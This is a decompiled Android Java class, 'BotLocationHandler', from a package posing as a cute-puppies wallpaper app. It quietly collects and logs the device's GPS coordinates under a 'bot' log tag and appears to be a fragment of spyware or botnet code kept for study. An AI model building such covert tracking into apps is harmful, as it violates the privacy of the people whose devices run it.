// 
// Decompiled by Procyon v0.5.30
// 

package com.adam.CutePuppiesWallpaper;

import android.os.Bundle;
import android.util.Log;
import android.location.Criteria;
import android.content.Context;
import android.location.LocationManager;
import android.location.Location;
import android.location.LocationListener;

public class BotLocationHandler implements LocationListener
{
    public static final String LOG_TAG = "MCS_BOT_BotLocationHandler";
    private static String bestProvider;
    private static Location locLastLocation;
    private static LocationManager locationManager;
    
    public static Location GetLastLocation() {
        return BotLocationHandler.locLastLocation;
    }
    
    public static void Initialize(final Context context) {
        BotLocationHandler.locationManager = (LocationManager)context.getSystemService("location");
        BotLocationHandler.bestProvider = BotLocationHandler.locationManager.getBestProvider(new Criteria(), false);
    }
    
    public void onLocationChanged(final Location locLastLocation) {
        Log.v("MCS_BOT_BotLocationHandler", String.valueOf(Double.toString(locLastLocation.getLatitude())) + " " + Double.toString(locLastLocation.getLongitude()) + " " + Double.toString(locLastLocation.getAltitude()));
        BotLocationHandler.locLastLocation = locLastLocation;
    }
    
    public void onProviderDisabled(final String s) {
    }
    
    public void onProviderEnabled(final String s) {
    }
    
    public void onStatusChanged(final String s, final int n, final Bundle bundle) {
    }
}
